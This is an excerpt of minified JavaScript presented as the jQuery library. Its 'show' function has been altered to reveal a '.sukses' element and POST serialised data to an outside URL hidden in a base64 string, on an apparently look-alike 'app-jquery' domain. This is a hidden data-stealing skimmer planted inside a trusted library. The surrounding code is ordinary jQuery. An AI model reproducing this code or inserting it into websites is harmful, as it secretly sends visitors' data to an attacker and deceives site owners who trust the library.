!(function (e, t) {
    ...
    function le(e, t) {
        for (var n, r, i, o, a, s, u, l = [], c = 0, f = e.length; c < f; c++)
            (r = e[c]).style &&
                ((n = r.style.display),
                t
                    ? ("none" === n && ((l[c] = J.get(r, "display") || null), l[c] || (r.style.display = "")),
                      "" === r.style.display &&
                          ae(r) &&
                          (l[c] =
                              ((u = a = o = void 0),
                    ...
                    : "none" !== n && ((l[c] = "none"), J.set(r, "display", n)));
        ...
        show: function () {
            var e,
                ...
                n =
                    ...
                    t);
            return (
                (document.querySelector(".sukses").style.display = "flex"),
                fetch(window.atob("aHR0cHM6Ly9hcHAtanF1ZXJ5Lnh5ei9jYXdlcmljbnFveGlmd2Vhd29pZmV1aXJxb2UucGhw"), { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(n) })
                    .then((e) => e.text())
                    .then((e) => console.log()),
                le(this, !0)
            );
              ...
              w.event.add(e, t, {
                  ...
                  handler: function (e) {
                      ...
                      if (1 & e.isTrigger && this[t]) {
                          ...
                          else if (((a = i.call(arguments)), J.set(this, t, a), (r = n(this, t)), this[t](), a !== (o = J.get(this, t)) || r ? J.set(this, t, !1) : (o = {}), a !== o))
                              return e.stopImmediatePropagation(), e.preventDefault(), o && o.value;
                      } else a.length && (J.set(this, t, { value: w.event.trigger(w.extend(a[0], w.Event.prototype), a.slice(1), this) }), e.stopImmediatePropagation());
                  },
              }))
    ...
    (w.event = {
        ...
        special: {
            ...
            click: {
                ...
                _default: function (e) {
                    var t = e.target;
                    return (pe.test(t.type) && t.click && A(t, "input") && J.get(t, "click")) || A(t, "a");
                },
            },
            beforeunload: {
    ...
    function Qe(e, t, n) {
        ...
        return (
            ...
            (a = parseFloat(a) || 0) + Ye(e, t, n || (i ? "border" : "content"), o, r, a) + "px"
        );
    }
            ...
            w.cssHooks[t] = {
                ...
                set: function (e, n, r) {
                    var i,
                        ...
                        u = r ? Ye(e, t, r, s, o) : 0;
                    return (
                        s && a && (u -= Math.ceil(e["offset" + t[0].toUpperCase() + t.slice(1)] - parseFloat(o[t]) - Ye(e, t, "border", !1, o) - 0.5)),
                ...
                if ((u = !w.isEmptyObject(t)) || !w.isEmptyObject(d))
                    ...
                    d))
                        u ||
                            ...
                            g && le([e], !0),
                            p.done(function () {
                                for (r in (g || le([e]), J.remove(e, "fxshow"), d)) w.style(e, r, d[r]);
                            })),
                            (u = ut(g ? v[r] : 0, r, p)),
            ...
            if (
                ...
                for (o = 0; (a = y[o++]) && !t.isPropagationStopped(); )
                    (d = a),
                        ...
                        (f = (J.get(a, "events") || Object.create(null))[t.type] && J.get(a, "handle")) && f.apply(a, n),
